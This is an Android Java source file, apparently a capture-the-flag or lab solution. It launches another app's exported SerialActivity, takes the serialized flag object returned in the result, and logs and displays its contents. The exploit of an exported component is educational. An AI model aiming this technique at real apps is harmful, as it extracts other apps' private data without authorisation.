package com.example.maliciousapp;


import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.example.victimapp.FlagContainer;


import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import java.io.Serializable;
public class serialintent extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_serialintent);

        ((Button) findViewById(R.id.btn_hackit)).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setClassName("com.example.victimapp", "com.example.victimapp.SerialActivity");
                startActivityForResult(intent, 1);
            }
        });

    }

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1 && resultCode == Activity.RESULT_OK) {

            Serializable extra = data.getSerializableExtra("flag");
            if (extra instanceof FlagContainer) {
                FlagContainer flagContainer = (FlagContainer) extra;
                // Access the decoded flag using the public method
                Log.d("MOBIOTSEC", "Decoded flag: " + flagContainer.getFlag() );
                ((TextView) findViewById(R.id.txt_flag)).setText( "Flag : " + flagContainer.getFlag());

            }
        }
    }
}

